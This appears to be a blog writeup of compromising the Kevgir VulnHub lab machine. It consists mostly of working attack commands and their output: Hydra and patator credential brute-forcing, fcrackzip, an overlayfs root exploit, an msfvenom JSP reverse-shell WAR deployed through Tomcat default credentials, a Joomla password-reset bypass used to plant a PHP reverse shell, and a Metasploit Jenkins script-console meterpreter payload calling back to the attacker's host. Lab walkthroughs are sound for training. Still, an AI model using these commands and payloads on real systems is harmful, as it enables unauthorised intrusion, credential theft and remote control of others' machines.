---
layout: post
title: "Pwning Kevgir"
date: 2017-12-02 14:08:05 -0500
comments: true
categories: [penetration testing, writeups]
keywords: kevgir, kevgir 1, kevgir vulnhub, vulnhub, pentest lab, hacking lab, ctf, patator, hydra, fcrackzip, redis, jenkins
description: Kevgir writeup
---

Kevgir is a machine vulnerable to multiple web application vulnerabilities designed by the *canyoupwnme* team. So..can we pwn it? Let's see!

<!-- more -->

Nmap results reveal that we'll have lots of targets to attack. So I'm going to break the format a little bit, and present the results for each port, along with the ways to hack it.

## Port 25 FTP bruteforce with Hydra

``` 
PORT      STATE SERVICE     VERSION
25/tcp    open  ftp         vsftpd 3.0.2
|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D
```

Couldn't find exploits for this and no anonymous access, so I tried the bruteforce route. Decided to try some other lists from the myriad available on Kali, and wasn't disappointed when I put Hydra to work:

``` 
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/mirai_pass.txt ftp://192.168.217.128:25
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-02 15:08:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 4816 login tries (l:112/p:43), ~301 tries per task
[DATA] attacking ftp://192.168.217.128:25/
[25][ftp] host: 192.168.217.128   login: admin   password: admin
```

I used the credentials to log to the FTP server, but didn't find anything particularly interesting. Let's move on!

## Port 80 phpmyadmin bruteforce with patator

``` 
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Kevgir VM
```

{% img center /images/pentest/kevgir/80.jpg 'port 80' 'port 80 apache' %}

Ran Nikto against it and found phpmyadmin running on it. Now I decided to try a new tool to bruteforce the phmyadmin page. Enter Patator!

### patator

Homepage: https://github.com/lanjelot/patator

> Patator is a Python multi-purpose brute-forcer, with a modular design and a flexible usage. 

Let's see the available modules:

``` 
Patator v0.6 (http://code.google.com/p/patator/)
Usage: patator module --help

Available modules:
  + ftp_login     : Brute-force FTP
  + ssh_login     : Brute-force SSH
  + telnet_login  : Brute-force Telnet
  + smtp_login    : Brute-force SMTP
  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
  + finger_lookup : Enumerate valid users using Finger
  + http_fuzz     : Brute-force HTTP
  + pop_login     : Brute-force POP3
  + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)
  + imap_login    : Brute-force IMAP4
  + ldap_login    : Brute-force LDAP
  + smb_login     : Brute-force SMB
  + smb_lookupsid : Brute-force SMB SID-lookup
  + rlogin_login  : Brute-force rlogin
  + vmauthd_login : Brute-force VMware Authentication Daemon
  + mssql_login   : Brute-force MSSQL
  + oracle_login  : Brute-force Oracle
  + mysql_login   : Brute-force MySQL
  + mysql_query   : Brute-force MySQL queries
  + pgsql_login   : Brute-force PostgreSQL
  + vnc_login     : Brute-force VNC
  + dns_forward   : Forward lookup names
  + dns_reverse   : Reverse lookup subnets
  + snmp_login    : Brute-force SNMP v1/2/3
  + unzip_pass    : Brute-force the password of encrypted ZIP files
  + keystore_pass : Brute-force the password of Java keystore files
  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
  + tcp_fuzz      : Fuzz TCP services
  + dummy_test    : Testing module
```

The Github page has examples for various modules. For this case, I assumed the username will be root, and I adapted a password file:

``` 
cat root_userpass.txt | awk '{print $2}' > ~/Desktop/rootpass.txt
```

The original file had lines of the format *root password*, so I only selected the second field of the passwords and created a new file for patator. Now I needed to learn more about the patator options:

``` 
patator http_fuzz --help
Patator v0.6 (http://code.google.com/p/patator/)
Usage: http_fuzz <module-options ...> [global-options ...]

Examples:
  http_fuzz url=http://10.0.0.1/FILE0 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
  http_fuzz url=http://10.0.0.1/manager/html user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401
  http_fuzz url=http://10.0.0.1/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'

Module options:
  url           : target url (scheme://host[:port]/path?query)
  body          : body data
  header        : use custom headers
  method        : method to use [GET | POST | HEAD | ...]
  auto_urlencode: automatically perform URL-encoding [1|0]
  user_pass     : username and password for HTTP authentication (user:pass)
  auth_type     : type of HTTP authentication [basic | digest | ntlm]
  follow        : follow any Location redirect [0|1]
  max_follow    : redirection limit [5]
  accept_cookie : save received cookies to issue them in future requests [0|1]
  http_proxy    : HTTP proxy to use (host:port)
  ssl_cert      : client SSL certificate file (cert+key in PEM format)
  timeout_tcp   : seconds to wait for a TCP handshake [10]
  timeout       : seconds to wait for a HTTP response [20]
  before_urls   : comma-separated URLs to query before the main request
  before_egrep  : extract data from the before_urls response to place in the main request
  after_urls    : comma-separated URLs to query after the main request
  max_mem       : store no more than N bytes of request+response data in memory [-1 (unlimited)]
  persistent    : use persistent connections [1|0] 

Global options:
  --version            show program's version number and exit
  -h, --help           show this help message and exit

  Execution:
    -x arg             actions and conditions, see Syntax below
    --start=N          start from offset N in the wordlist product
    --stop=N           stop at offset N
    --resume=r1[,rN]*  resume previous run
    -e arg             encode everything between two tags, see Syntax below
    -C str             delimiter string in combo files (default is ':')
    -X str             delimiter string in conditions (default is ',')

  Optimization:
    --rate-limit=N     wait N seconds between tests (default is 0)
    --max-retries=N    skip payload after N failures (default is 4) (-1 for
                       unlimited)
    -t N, --threads=N  number of threads (default is 10)

  Logging:
    -l DIR             save output and response data into DIR
    -L SFX             automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX
                       (DIR defaults to '/tmp/patator')

  Debugging:
    -d, --debug        enable debug messages

Syntax:
 -x actions:conditions

    actions    := action[,action]*
    action     := "ignore" | "retry" | "free" | "quit" | "reset"
    conditions := condition=value[,condition=value]*
    condition  := "code" | "size" | "time" | "mesg" | "fgrep" | "egrep" | "clen"

    ignore      : do not report
    retry       : try payload again
    free        : dismiss future similar payloads
    quit        : terminate execution now
    reset       : close current connection in order to reconnect next time

    code        : match status code
    size        : match size (N or N-M or N- or -N)
    time        : match time (N or N-M or N- or -N)
    mesg        : match message
    fgrep       : search for string in mesg
    egrep       : search for regex in mesg
    clen        : match Content-Length header (N or N-M or N- or -N)

For example, to ignore all redirects to the home page:
... -x ignore:code=302,fgrep='Location: /home.html'

 -e tag:encoding

    tag        := any unique string (eg. T@G or _@@_ or ...)
    encoding   := "url" | "sha1" | "md5" | "hex" | "b64"

    url         : url encode
    sha1        : hash in sha1
    md5         : hash in md5
    hex         : encode in hexadecimal
    b64         : encode in base64

For example, to encode every password in base64:
... host=10.0.0.1 user=admin password=_@@_FILE0_@@_ -e _@@_:b64

Please read the README inside for more examples and usage information.
```

Luckily, on the Github page there is an example of phpmyadmin bruteforcing that I could adapt:

``` 
http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
```

And we have the password!

``` 
patator http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
17:17:27 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2017-12-02 17:17 EST
17:17:27 patator    INFO -                                                                              
17:17:27 patator    INFO - code size:clen       time | candidate                          |   num | mesg
17:17:27 patator    INFO - -----------------------------------------------------------------------------
17:17:27 patator    INFO - 200  9865:7910      0.366 |                                    |     1 | HTTP/1.1 200 OK
17:17:29 patator    INFO - 200  48618:-1       0.938 | toor                               |    34 | HTTP/1.1 200 OK
17:17:29 patator    INFO - Hits/Done/Skip/Fail/Size: 2/52/0/0/52, Avg: 21 r/s, Time: 0h 0m 2s
```

Inside there are multiple databases, but at this point, I moved on to the next.

## Cracking ZIP archives

``` 
PORT      STATE SERVICE     VERSION
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      33719/tcp  mountd
|   100005  1,2,3      41291/udp  mountd
|   100021  1,3,4      47439/tcp  nlockmgr
|   100021  1,3,4      60285/udp  nlockmgr
|   100024  1          57769/udp  status
|   100024  1          58840/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
47439/tcp open  nlockmgr    1-4 (RPC #100021)
48137/tcp open  mountd      1-3 (RPC #100005)
58840/tcp open  status      1 (RPC #100024)
33719/tcp open  mountd      1-3 (RPC #100005)
43866/tcp open  mountd      1-3 (RPC #100005)
```

Alright, there's an NFS here with what appears to be a backup file:

``` 
showmount -e 192.168.217.128
Export list for 192.168.217.128:
/backup *
```

I mounted it on my machine and found an archive:

``` 
root@kali:/mnt# mkdir backup
root@kali:/mnt# mount 192.168.217.128:/backup /mnt/backup
ls -la
total 12760
drwxr-xr-x 2 root root     4096 Feb 14  2016 .
drwxr-xr-x 4 root root     4096 Dec  2 17:45 ..
-rw-r--r-- 1 root root 13058028 Feb 14  2016 backup.tar.bz2.zip
```

When I tried unzipping it, I got prompted for a password:

``` 
unzip backup.tar.bz2.zip 
Archive:  backup.tar.bz2.zip
[backup.tar.bz2.zip] backup.tar.bz2 password:
```

There is an utility that will come just in handy for this, called **fcrackzip**:

``` 
fcrackzip --help

fcrackzip version 1.0, a fast/free zip password cracker
written by Marc Lehmann <pcg@goof.com> You can find more info on
http://www.goof.com/pcg/marc/

USAGE: fcrackzip
          [-b|--brute-force]            use brute force algorithm
          [-D|--dictionary]             use a dictionary
          [-B|--benchmark]              execute a small benchmark
          [-c|--charset characterset]   use characters from charset
          [-h|--help]                   show this message
          [--version]                   show the version of this program
          [-V|--validate]               sanity-check the algortihm
          [-v|--verbose]                be more verbose
          [-p|--init-password string]   use string as initial password/file
          [-l|--length min-max]         check password with length min to max
          [-u|--use-unzip]              use unzip to weed out wrong passwords
          [-m|--method num]             use method number "num" (see below)
          [-2|--modulo r/m]             only calculcate 1/m of the password
          file...                    the zipfiles to crack

methods compiled in (* = default):

 0: cpmask
 1: zip1
*2: zip2, USE_MULT_TAB
```

Since the passwords so far have been laughable, I used it in bruteforce mode, but still I was really surprised to get the password instantly:

``` 
fcrackzip -b -u -v backup.tar.bz2.zip 
found file 'backup.tar.bz2', (size cp/uc 13057834/13076586, flags 9, chk 28e3)


PASSWORD FOUND!!!!: pw == aaaaaa
```

From the archive I extracted a html folder filled with what appear to be web applications:

``` 
ls
dvwa  gentleman  index.html  web-standards  zenphoto
```

I found some passwords inside, but the content was massive. Maybe I will get back to it later, if needed.

## Samba

``` 
PORT      STATE SERVICE     VERSION
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   Computer name: canyoupwnme
|   NetBIOS computer name: CANYOUPWNME\x00
|   Domain name: 
|   FQDN: canyoupwnme
|_  System time: 2017-12-02T21:15:36+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2017-12-02 14:15:37
|_  start_date: 1600-12-31 19:03:58
```

Time to gather some more information with enum4linux. This gave a plethora of info, but to summarize, it found the users: root, admin, user.


## SSH - privilege escalation

``` 
PORT      STATE SERVICE     VERSION
1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
|   256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
|_  256 11:99:87:52:15:c8:ae:96:64:73:d6:49:8c:d7:d7:9f (EdDSA)
```

Here I tried connecting with the credentials I knew, and got in with the admin/admin pair. I searched for a privilege escalation exploit then, and reading /etc/issue was helpful in that regard:

``` 
cat /etc/issue
Ubuntu 14.04.3 LTS \n \l
```

Found the [overlayfs applicable exploit](https://www.exploit-db.com/exploits/39166/), downloaded, compiled and boom:

``` 
admin@canyoupwnme:~$ ./overlayfs 
root@canyoupwnme:~# id
uid=0(root) gid=1002(admin) groups=0(root),1002(admin)
root@canyoupwnme:~# whoami
root
```

## Redis

``` 
PORT      STATE SERVICE     VERSION
6379/tcp  open  redis       Redis key-value store 3.0.7
```

Redis is something you don't get very often on boot2roots, so this was definitely interesting! First, what is [Redis](https://redis.io/topics/introduction)?

> Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message 
> broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, 
> hyperloglogs and geospatial indexes with radius queries. Redis has built-in replication, Lua scripting, LRU 
> eviction, transactions and different levels of on-disk persistence, and provides high availability via Redis 
> Sentinel and automatic partitioning with Redis Cluster

The Redis instance can be accessed with the *redis-cli* tool. I had to install the *redis-tools* package to get it.

``` 
redis-cli -h
redis-cli 4.0.2

Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]
  -h <hostname>      Server hostname (default: 127.0.0.1).
  -p <port>          Server port (default: 6379).
  -s <socket>        Server socket (overrides hostname and port).
  -a <password>      Password to use when connecting to the server.
  -r <repeat>        Execute specified command N times.
  -i <interval>      When -r is used, waits <interval> seconds per command.
                     It is possible to specify sub-second times like -i 0.1.
  -n <db>            Database number.
  -x                 Read last argument from STDIN.
  -d <delimiter>     Multi-bulk delimiter in for raw formatting (default: \n).
  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).
  --raw              Use raw formatting for replies (default when STDOUT is
                     not a tty).
  --no-raw           Force formatted output even when STDOUT is not a tty.
  --csv              Output in CSV format.
  --stat             Print rolling stats about server: mem, clients, ...
  --latency          Enter a special mode continuously sampling latency.
                     If you use this mode in an interactive session it runs
                     forever displaying real-time stats. Otherwise if --raw or
                     --csv is specified, or if you redirect the output to a non
                     TTY, it samples the latency for 1 second (you can use
                     -i to change the interval), then produces a single output
                     and exits.
  --latency-history  Like --latency but tracking latency changes over time.
                     Default time interval is 15 sec. Change it using -i.
  --latency-dist     Shows latency as a spectrum, requires xterm 256 colors.
                     Default time interval is 1 sec. Change it using -i.
  --lru-test <keys>  Simulate a cache workload with an 80-20 distribution.
  --slave            Simulate a slave showing commands received from the master.
  --rdb <filename>   Transfer an RDB dump from remote server to local file.
  --pipe             Transfer raw Redis protocol from stdin to server.
  --pipe-timeout <n> In --pipe mode, abort with error if after sending all data.
                     no reply is received within <n> seconds.
                     Default timeout: 30. Use 0 to wait forever.
  --bigkeys          Sample Redis keys looking for big keys.
  --scan             List all keys using the SCAN command.
  --pattern <pat>    Useful with --scan to specify a SCAN pattern.
  --intrinsic-latency <sec> Run a test to measure intrinsic system latency.
                     The test will run for the specified amount of seconds.
  --eval <file>      Send an EVAL command using the Lua script at <file>.
  --ldb              Used with --eval enable the Redis Lua debugger.
  --ldb-sync-mode    Like --ldb but uses the synchronous Lua debugger, in
                     this mode the server is blocked and script changes are
                     are not rolled back from the server memory.
  --help             Output this help and exit.
  --version          Output version and exit.

Examples:
  cat /etc/passwd | redis-cli -x set mypasswd
  redis-cli get mypasswd
  redis-cli -r 100 lpush mylist x
  redis-cli -r 100 -i 1 info | grep used_memory_human:
  redis-cli --eval myscript.lua key1 key2 , arg1 arg2 arg3
  redis-cli --scan --pattern '*:12345*'

  (Note: when using --eval the comma separates KEYS[] from ARGV[] items)

When no command is given, redis-cli starts in interactive mode.
Type "help" in interactive mode for information on available commands
and settings.
```

So I pointed the CLI tool to the Redis server and got a lot of information:

``` 
redis-cli -h 192.168.217.128
192.168.217.128:6379> help
redis-cli 4.0.2
To get help about Redis commands type:
      "help @<group>" to get a list of commands in <group>
      "help <command>" for help on <command>
      "help <tab>" to get a list of possible help topics
      "quit" to exit

To set redis-cli preferences:
      ":set hints" enable online hints
      ":set nohints" disable online hints
Set your preferences in ~/.redisclirc
192.168.217.128:6379> info
# Server
redis_version:3.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:aa70bcb321ba8313
redis_mode:standalone
os:Linux 3.19.0-25-generic i686
arch_bits:32
multiplexing_api:epoll
gcc_version:4.8.4
process_id:1263
run_id:859e316c5f791eee47cb4e7aabdccfd2c3a124b9
tcp_port:6379
uptime_in_seconds:3235
uptime_in_days:0
hz:10
lru_clock:2368010
config_file:/etc/redis/6379.conf

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:637624
used_memory_human:622.68K
used_memory_rss:8929280
used_memory_peak:637624
used_memory_peak_human:622.68K
used_memory_lua:24576
mem_fragmentation_ratio:14.00
mem_allocator:jemalloc-3.6.0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1512314215
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok

# Stats
total_connections_received:2
total_commands_processed:2
instantaneous_ops_per_sec:0
total_net_input_bytes:41
total_net_output_bytes:6067614
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0

# Replication
role:master
connected_slaves:0
master_repl_offset:0
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:3.71
used_cpu_user:1.60
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Cluster
cluster_enabled:0

# Keyspace
192.168.217.128:6379> 
```

It turns out, Redis is by default not that secure, and there are ways to achieve a somewhat arbitrary file upload on hosts running the Redis server. You can find a detailed explanation about it [here](http://antirez.com/news/96). I followed the steps outlined, and I also tried with the Metasploit Redis File Upload module, but it didn't work. Maybe some permissions issue, or Redis not running as root. The attempt was centered around copying an SSH key I generated to the remote authorized_keys file. But even though I didn't manage it, I learned something new about exploiting Redis today.


## Tomcat default credentials

``` 
PORT      STATE SERVICE     VERSION
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
```

Time to look at that Tomcat server! 

``` 
nikto -h http://192.168.217.128:8080/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.217.128
+ Target Hostname:    192.168.217.128
+ Target Port:        8080
+ Start Time:         2017-12-03 12:21:45 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /: Appears to be a default Apache Tomcat install.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat.
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 7661 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2017-12-03 12:22:12 (GMT-5) (27 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Nikto found the default credentials of tomcat/tomcat. Used them to log in to the Web Application Manager interface.

{% img center /images/pentest/kevgir/manager-fullpage.png 'manager' 'tomcat web application manager' %}

The interesting part here is that we can upload a WAR file. A Web Application Resource file is a JAR file used to distribute various components that make up a web application. For this particular scenario, I decided to generate a payload with msfvenom, but there is also a Metasploit module that can do the job: <code>msfvenom -a x86 --platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war</code>

``` 
msfvenom -a x86 --platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war
Payload size: 1099 bytes
Final size of war file: 1099 bytes
Saved as: runme.war
```

Check what's inside:

``` 
jar -tf runme.war 
WEB-INF/
WEB-INF/web.xml
kndeoavjwgjs.jsp
```

I deployed it and a new folder called /runme was created on the server. With a netcat listening, I browsed to the folder and bam!

``` 
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 37009
whoami
tomcat7
```

Since I already showed earlier the method of getting root, I will stop after getting the low privilege shells.

## Joomla

``` 
PORT      STATE SERVICE     VERSION
8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Joomla! 1.5 - Open Source Content Management
| http-robots.txt: 14 disallowed entries 
| /administrator/ /cache/ /components/ /images/ 
| /includes/ /installation/ /language/ /libraries/ /media/ 
|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to the Frontpage
```

{% img center /images/pentest/kevgir/8081.jpg 'joomla' 'joomla' %}

It's a Joomla page, so I fired up joomscan. There was a lot of output, I'm only showing here the findings I used for exploitation:

``` 
* The Exact version found is 1.5.1
# 15
Info -> CoreComponent: Joomla Remote Admin Password Change Vulnerability 
Versions Affected: 1.5.5 <= 
Check: /components/com_user/controller.php
Exploit: 1. Go to url : target.com/index.php?option=com_user&view=reset&layout=confirm  2. Write into field "token" char ' and Click OK.  3. Write new password for admin  4. Go to url : target.com/administrator/  5. Login admin with new password 
Vulnerable? Yes
```

This vulnerability is tracked under CVE-2008-3681:

> components/com_user/models/reset.php in Joomla! 1.5 through 1.5.5 does not properly validate reset tokens, which 
> allows remote attackers to reset the "first enabled user (lowest id)" password, typically for the administrator

So I followed the directions and went to http://192.168.217.128:8081/index.php?option=com_user&view=reset&layout=confirm

{% img center /images/pentest/kevgir/token.jpg 'token' 'password reset bypass' %}

Inside the token field I put a **'** and then I was taken to a password reset screen where I changed the admin password and finally logged in:

{% img center /images/pentest/kevgir/joomla.jpg 'joomla' 'joomla' %}

Inside the Extensions, there is a Template Manager page, where I selected a template and edited its HTML:

{% img center /images/pentest/kevgir/template.jpg 'template' 'joomla template' %}

I copied the source code for PentestMonkey's reverse PHP shell, saved the template and reloaded the main page to be served a new shell:

``` 
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 57836
Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
 19:40:29 up 39 min,  0 users,  load average: 0.15, 0.11, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## Jenkins

``` 
PORT      STATE SERVICE     VERSION
9000/tcp  open  http        Jetty winstone-2.9
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(winstone-2.9)
|_http-title: Dashboard [Jenkins]
```

{% img center /images/pentest/kevgir/jenkins.jpg 'jenkins' 'jenkins dashboard' %}

Jenkins was a new target for me. Let's first understand what it's used for:

> Jenkins is a self-contained, open source automation server written in Java that can be used to automate all sorts of
> tasks related to building, testing, and delivering or deploying software.

I searched in Metasploit and found the <code>auxiliary/scanner/http/jenkins_enum</code>module:

``` 
msf auxiliary(jenkins_enum) > info

       Name: Jenkins-CI Enumeration
     Module: auxiliary/scanner/http/jenkins_enum
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Jeff McCutchan

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module enumerates a remote Jenkins-CI installation in an 
  unauthenticated manner, including host operating system and Jenkins 
  installation details.
```

I ran the enumeration module. Had to change the path to the root folder before I got any output:

``` 
msf auxiliary(jenkins_enum) > exploit

[+] 192.168.217.128:9000  - Jenkins Version 1.647
[*] /script restricted (403)
[*] /view/All/newJob restricted (403)
[+] http://192.168.217.128:9000/ - /asynchPeople/ does not require authentication (200)
[*] /systemInfo restricted (403)
```

This information did not mean much to me, but I went to the only folder that returned a 200 code and found the usernames recognized by the server

{% img center /images/pentest/kevgir/jenkins-admin.jpg 'jenkins admin' 'jenkins admin' %}

Knowing now there is an admin user, I went again to the bruteforce route, which was quite successful so far:

``` 
Module options (auxiliary/scanner/http/jenkins_login):

   Name              Current Setting                                     Required  Description
   ----              ---------------                                     --------  -----------
   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
   HTTP_METHOD       POST                                                yes       The HTTP method to use for the login (Accepted: GET, POST)
   LOGIN_URL         /j_acegi_security_check                             yes       The URL that handles the login process
   PASSWORD                                                              no        A specific password to authenticate with
   PASS_FILE         /usr/share/wordlists/metasploit/unix_passwords.txt  no        File containing passwords, one per line
   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            192.168.217.128                                     yes       The target address range or CIDR identifier
   RPORT             9000                                                yes       The target port (TCP)
   SSL               false                                               no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   true                                                yes       Stop guessing when a credential works for a host
   THREADS           1                                                   yes       The number of concurrent threads
   USERNAME          admin                                               no        A specific username to authenticate as
   USERPASS_FILE                                                         no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                               no        Try the username as the password for all users
   USER_FILE                                                             no        File containing usernames, one per line
   VERBOSE           true                                                yes       Whether to print output for all attempts
   VHOST                                                                 no        HTTP server virtual host
```

At first it didn't work, because I changed the login URL to correspond to the URL path. But I had to leave it as /j_acegi_security_check (I checked the source code and saw that it was correct), and then it found the credentials admin/hello: 

``` 
[+] 192.168.217.128:9000 - Login Successful: admin:hello
```                                                       

So now I was able to login and look at things and change them. Interestingly, the exploitation didn't stop here. There is a module that also allowed me to get a shell with the credentials:

> This module uses the Jenkins-CI Groovy script console to execute OS commands using Java.

Don't forget to select the target as Linux:

``` 
options

Module options (exploit/multi/http/jenkins_script_console):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   API_TOKEN                   no        The API token for the specified username
   PASSWORD   hello            no        The password for the specified username
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      192.168.217.128  yes       The target address
   RPORT      9000             yes       The target port (TCP)
   SRVHOST    192.168.217.132  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path to the Jenkins-CI application
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   admin            no        The username to authenticate as
   VHOST                       no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.217.132  yes       The listen address
   LPORT  8080             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux
```

And a new shell appears!

``` 
msf exploit(jenkins_script_console) > exploit

[*] Started reverse TCP handler on 192.168.217.132:8080 
[*] Checking access to the script console
[*] Logging in...
[*] 192.168.217.128:9000 - Sending Linux stager...
[*] Sending stage (849108 bytes) to 192.168.217.128
